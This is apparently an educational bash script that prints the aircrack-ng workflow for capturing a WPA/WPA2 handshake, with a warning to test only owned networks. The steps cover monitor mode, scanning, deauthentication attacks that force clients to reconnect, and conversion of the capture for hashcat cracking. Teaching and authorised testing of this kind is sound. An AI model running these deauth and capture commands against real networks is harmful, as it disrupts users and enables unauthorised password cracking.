#!/usr/bin/env bash
# aircrack-ng/capture-handshake.sh — Capture WPA/WPA2 4-way handshake for offline cracking
source "$(dirname "$0")/../common.sh"

show_help() {
    echo "Usage: $(basename "$0") [interface] [-h|--help]"
    echo ""
    echo "Description:"
    echo "  Captures a WPA/WPA2 4-way handshake for offline password cracking."
    echo "  Shows the complete workflow from monitor mode to handshake capture."
    echo "  Requires a wireless interface. Default interface: wlan0"
    echo ""
    echo "Examples:"
    echo "  $(basename "$0")          # Use default interface wlan0"
    echo "  $(basename "$0") wlan1    # Use a specific interface"
    echo "  $(basename "$0") --help   # Show this help message"
}

[[ "${1:-}" =~ ^(-h|--help)$ ]] && show_help && exit 0

require_cmd airmon-ng "brew install aircrack-ng"

INTERFACE="${1:-wlan0}"

safety_banner

info "=== WPA/WPA2 Handshake Capture ==="
info "Interface: ${INTERFACE}"
warn "All commands require root/sudo. Only test networks you own."
echo ""

info "How does WPA handshake capture work?"
echo "   The WPA 4-way handshake occurs when a client connects to an access point."
echo "   It contains the encrypted password hash needed for offline cracking."
echo ""
echo "   Capture methods:"
echo "     1. Passive: Wait for a client to naturally connect (slow but stealthy)"
echo "     2. Active: Send deauthentication frames to force reconnection (fast)"
echo ""
echo "   Requirements:"
echo "     - Wireless adapter that supports monitor mode"
echo "     - Target network must have connected clients (for deauth)"
echo "     - Physical proximity to the access point"
echo ""

# 1. Check wireless interface capabilities
info "1) Check wireless interface capabilities"
echo "   sudo airmon-ng"
echo ""

# 2. Start monitor mode
info "2) Start monitor mode"
echo "   sudo airmon-ng start ${INTERFACE}"
echo ""

# 3. Scan for networks
info "3) Scan for networks (all channels)"
echo "   sudo airodump-ng ${INTERFACE}mon"
echo ""

# 4. Target a specific network by BSSID and channel
info "4) Target a specific network by BSSID and channel"
echo "   sudo airodump-ng --bssid AA:BB:CC:DD:EE:FF -c 6 -w capture ${INTERFACE}mon"
echo ""

# 5. Send deauth to force reconnection
info "5) Send deauth to force client reconnection (5 frames)"
echo "   sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF ${INTERFACE}mon"
echo ""

# 6. Targeted deauth to specific client
info "6) Targeted deauth to a specific client"
echo "   sudo aireplay-ng --deauth 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 ${INTERFACE}mon"
echo ""

# 7. Verify handshake was captured
info "7) Verify handshake was captured"
echo "   aircrack-ng capture-01.cap"
echo ""

# 8. Convert capture for hashcat
info "8) Convert capture for hashcat (GPU cracking)"
echo "   aircrack-ng capture-01.cap -J capture_hccapx"
echo ""

# 9. Stop monitor mode when done
info "9) Stop monitor mode when done"
echo "   sudo airmon-ng stop ${INTERFACE}mon"
echo ""

# 10. Complete workflow in sequence
info "10) Complete workflow in sequence"
echo "    sudo airmon-ng start ${INTERFACE} && sudo airodump-ng --bssid BSSID -c CH -w handshake ${INTERFACE}mon"
echo ""

# Interactive demo (skip if non-interactive)
[[ ! -t 0 ]] && exit 0

read -rp "List wireless interfaces with airmon-ng? (requires sudo) [y/N] " answer
if [[ "$answer" =~ ^[Yy]$ ]]; then
    info "Running: sudo airmon-ng"
    echo ""
    sudo airmon-ng 2>&1 || true
    echo ""
    info "Next steps:"
    echo "   1. Pick your wireless interface from the list above"
    echo "   2. Enable monitor mode: sudo airmon-ng start <interface>"
    echo "   3. Scan for networks: sudo airodump-ng <interface>mon"
    echo "   4. Target a network and capture the handshake"
fi
